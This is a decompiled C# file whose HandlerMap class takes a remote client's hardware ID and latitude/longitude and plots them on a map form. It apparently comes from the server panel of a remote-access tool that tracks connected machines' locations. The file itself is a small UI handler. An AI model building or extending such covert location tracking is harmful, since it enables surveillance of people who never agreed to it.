using System;
using System.Windows.Forms;
using GMap.NET;
using GMap.NET.WindowsForms;
using GMap.NET.WindowsForms.Markers;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000046 RID: 70
	internal class HandlerMap
	{
		// Token: 0x060001BD RID: 445 RVA: 0x0001C43C File Offset: 0x0001A63C
		public static void Read(Clients client, object[] objects)
		{
			FormMap form = (FormMap)Application.OpenForms["Map:" + (string)objects[1]];
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			client.Tag = form;
			client.Hwid = (string)objects[1];
			PointLatLng point = new PointLatLng((double)objects[2], (double)objects[3]);
			GMapMarker gmapMarker = new GMarkerGoogle(point, GMarkerGoogleType.green_small);
			gmapMarker.Position = point;
			GMapOverlay markers = new GMapOverlay("MyHome");
			markers.Markers.Add(gmapMarker);
			form.Invoke(new MethodInvoker(delegate()
			{
				form.Text = string.Concat(new string[]
				{
					"Map [",
					(string)objects[1],
					"] [lat: ",
					((double)objects[2]).ToString(),
					" lng: ",
					((double)objects[3]).ToString(),
					"]"
				});
				form.client = client;
				form.gMapControl1.Enabled = true;
				form.gMapControl1.Overlays.Add(markers);
				form.gMapControl1.Position = point;
				form.gMapControl1.ShowCenter = false;
			}));
		}
	}
}
